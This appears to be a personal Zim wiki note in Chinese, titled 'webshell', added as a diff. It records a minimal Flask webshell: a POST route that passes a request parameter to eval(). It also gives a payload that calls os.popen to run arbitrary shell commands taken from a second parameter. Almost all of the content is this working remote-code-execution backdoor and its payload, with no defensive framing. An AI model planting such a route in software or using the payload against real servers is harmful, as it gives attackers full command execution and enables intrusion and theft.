@@ -1,0 +1,15 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.6
+Creation-Date: 2024-11-25T11:34:42+08:00
+
+====== webshell ======
+Created 星期一 25 十一月 2024
+
+基于flask，要route支持POST，感觉一般用不到
+''@app.route('/shell', methods=['POST'])''
+''def shell():''
+	''return eval(request.values['arg'])''
+
+传参arg=''__import__('os').popen(request.values.get('shell')).read() ，''密码为shell
+
+
